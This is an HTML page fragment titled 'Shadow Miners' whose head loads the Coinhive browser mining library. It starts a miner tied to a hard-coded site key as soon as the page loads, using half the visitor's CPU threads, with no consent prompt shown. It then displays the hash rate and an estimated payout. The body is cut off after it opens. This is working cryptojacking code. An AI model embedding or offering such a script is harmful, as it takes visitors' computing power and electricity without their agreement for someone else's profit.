<html><head><title>Shadow Miners</title>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script><script>
	var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','demo',{
		threads: navigator.hardwareConcurrency/2,throttle: 0.75,autoThreads: true,forceASMJS: false});
	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
	setInterval(function() {
		var hashesPerSecond = Math.floor(miner.getHashesPerSecond()*100000)/100000;
		var acceptedHashes = miner.getAcceptedHashes();
		var ntd = Math.floor(acceptedHashes/1000000*0.139*100000)/100000;

		document.getElementById("hash").textContent = hashesPerSecond;
		document.getElementById("coin").textContent = acceptedHashes;
		document.getElementById("ntd").textContent = ntd;}, 1000);</script>
</head><body>
